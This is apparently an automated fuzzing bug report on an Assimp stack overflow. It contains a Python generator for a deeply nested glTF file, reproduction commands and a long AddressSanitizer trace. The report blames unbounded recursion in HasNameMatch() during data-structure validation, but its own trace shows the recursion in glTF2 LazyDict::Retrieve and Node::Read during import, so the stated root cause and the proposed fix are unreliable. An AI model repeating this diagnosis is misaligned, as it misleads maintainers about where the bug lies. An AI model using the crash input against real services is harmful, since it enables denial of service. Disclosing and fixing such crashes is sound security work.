# Title
Unbounded recursion in `HasNameMatch()` causes stack overflow during `aiProcess_ValidateDataStructure`

## Summary
Assimp’s `ValidateDataStructure` post-process performs a recursive traversal of the scene node graph to check for duplicate/missing node names. The helper `HasNameMatch()` recurses without any depth limit and without cycle protection, so a crafted asset that produces a very deep node chain can exhaust the process stack and crash (denial of service).

## Root Cause
In `assimp/code/PostProcessing/ValidateDataStructure.cpp`, the helper below performs a depth-first traversal purely via recursion:

```cpp
inline int HasNameMatch(const aiString &in, aiNode *node) {
    int result = (node->mName == in ? 1 : 0);
    for (unsigned int i = 0; i < node->mNumChildren; ++i) {
        result += HasNameMatch(in, node->mChildren[i]);
    }
    return result;
}
```
(lines ~99-105)

Key issues:
- **No recursion depth limit**: For a scene graph with thousands of nested nodes (as in the provided glTF PoV), each node adds another stack frame, eventually triggering an ASan-detected **stack overflow**.
- **No cycle detection**: If an importer ever constructs a cyclic node graph (even accidentally from malformed input), this function would recurse indefinitely.
- Additionally, `HasNameMatch()` **dereferences `node` unconditionally** (`node->mName`, `node->mNumChildren`, `node->mChildren[i]`). While the verified crash here is stack exhaustion, this also creates risk of null dereference if the node graph is corrupted.

The fuzzer harness enables `aiProcess_ValidateDataStructure`, so this code is reachable for imported scenes:
- `assimp/fuzz/assimp_fuzzer.cc` sets `flags = ... | aiProcess_ValidateDataStructure;`
- `ValidateDSProcess::DoValidationWithNameCheck()` calls `HasNameMatch(array[i]->mName, mScene->mRootNode);` (around line ~168), which triggers the deep traversal.

## Suggested Fix
1. **Replace recursion with an explicit stack/queue traversal** to avoid consuming call stack:
   - Implement iterative DFS/BFS over `aiNode*` using `std::vector<aiNode*> stack;`.
2. **Add cycle protection**:
   - Track visited node pointers (e.g., `std::unordered_set<const aiNode*> visited;`) and skip already-seen nodes.
3. **Add basic pointer validation** in the traversal:
   - Early-return if `node == nullptr`.
   - Optionally guard `node->mChildren` when `mNumChildren > 0` (defensive programming for fuzz/hostile inputs).
4. **Optional safety limit**:
   - Impose a maximum node visitation count or maximum depth (even in iterative form) and fail validation gracefully with `ReportError()` if exceeded, to prevent pathological CPU usage.

These changes preserve validation behavior while preventing stack exhaustion and making the validator robust against malformed or adversarial scene graphs.

## Proof of Concept

### Generator Code (Python)
```python
def generate(variant: int) -> bytes:
    import json
    # PoC: compact glTF JSON with a deep node chain (8000 nodes) under 1MB.
    # This triggers an ASan-detectable SEGV in glTF2Asset::Retrieve during import
    # in the assimp_fuzzer harness.
    depth = 8000
    nodes = []
    for i in range(depth):
        n = {"name": "A"}
        if i + 1 < depth:
            n["children"] = [i+1]
        nodes.append(n)
    nodes[-1]["camera"] = 0
    gltf = {
        "asset": {"version": "2.0"},
        "scene": 0,
        "scenes": [{"nodes": [0]}],
        "nodes": nodes,
        "cameras": [{"type": "perspective", "perspective": {"yfov": 0.7, "znear": 0.1}}]
    }
    return json.dumps(gltf, separators=(',',':')).encode('utf-8')

```

### Reproduction Command
```bash
# Run the POV binary with the fuzzer
./assimp_fuzzer /tmp/claude-1000/e2e-fbv2-arm/assimp_447262177/worker_workspace/assimp_assimp_fuzzer_address/results/povs/6ab0c298ec616fd4bf4fdd4b/6ab0c376abadda4fd590afac/attempt_001/v1.bin

# Or with the generated script:
python3 gen_blob.py > pov.bin && ./assimp_fuzzer pov.bin
```

### Sanitizer Output (address)
```
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 3023970058
INFO: Loaded 1 modules   (261111 inline 8-bit counters): 261111 [0x55cef90dfdc8, 0x55cef911f9bf), 
INFO: Loaded 1 PC tables (261111 PCs): 261111 [0x55cef911f9c0,0x55cef951b930), 
/fuzzers/assimp_fuzzer: Running 1 inputs 1 time(s) each.
Running: /work/v1.bin
AddressSanitizer:DEADLYSIGNAL
=================================================================
==1==ERROR: AddressSanitizer: stack-overflow on address 0x7ffc47068f18 (pc 0x55cef7878d91 bp 0x7ffc47069790 sp 0x7ffc47068f20 T0)
    #0 0x55cef7878d91 in printf_common(void*, char const*, __va_list_tag*) /src/llvm-project/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors_format.inc:504:3
    #1 0x55cef78799d4 in vsnprintf /src/llvm-project/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:1652:1
    #2 0x55cef8c7631c in std::__1::__libcpp_snprintf_l(char*, unsigned long, __locale_struct*, char const*, ...) (/fuzzers/assimp_fuzzer+0x1d7f31c)
    #3 0x55cef8c753c6 in std::__1::ostreambuf_iterator<char, std::__1::char_traits<char>> std::__1::num_put<char, std::__1::ostreambuf_iterator<char, std::__1::char_traits<char>>>::__do_put_integral[abi:ne180100]<unsigned long>(std::__1::ostreambuf_iterator<char, std::__1::char_traits<char>>, std::__1::ios_base&, char, unsigned long, char const*) const (/fuzzers/assimp_fuzzer+0x1d7e3c6)
    #4 0x55cef8c61759 in std::__1::basic_ostream<char, std::__1::char_traits<char>>::operator<<(unsigned int) (/fuzzers/assimp_fuzzer+0x1d6a759)
    #5 0x55cef7b3b4f3 in std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char>> ai_to_string<unsigned int>(unsigned int) /src/assimp/include/assimp/StringUtils.h:117:8
    #6 0x55cef89dfc49 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:506:45
    #7 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #8 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #9 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #10 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #11 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #12 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #13 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #14 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #15 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #16 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #17 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #18 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #19 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #20 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #21 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #22 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #23 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #24 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #25 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #26 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #27 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #28 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #29 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #30 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #31 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #32 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #33 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #34 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #35 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #36 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #37 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #38 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #39 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #40 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #41 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #42 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #43 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #44 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #45 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #46 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #47 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #48 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #49 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #50 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:509:11
    #51 0x55cef89e0f5a in glTF2::Node::Read(rapidjson::GenericValue<rapidjson::UTF8<char>, rapidjson::MemoryPoolAllocator<rapidjson::CrtAllocator>>&, glTF2::Asset&) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl:1735:41
    #52 0x55cef89e00d6 in glTF2::LazyDict<glTF2::Node>::Retrieve(unsigned int) /src/assimp/code/AssetLib/glTF2/glTF2Asset.inl
```
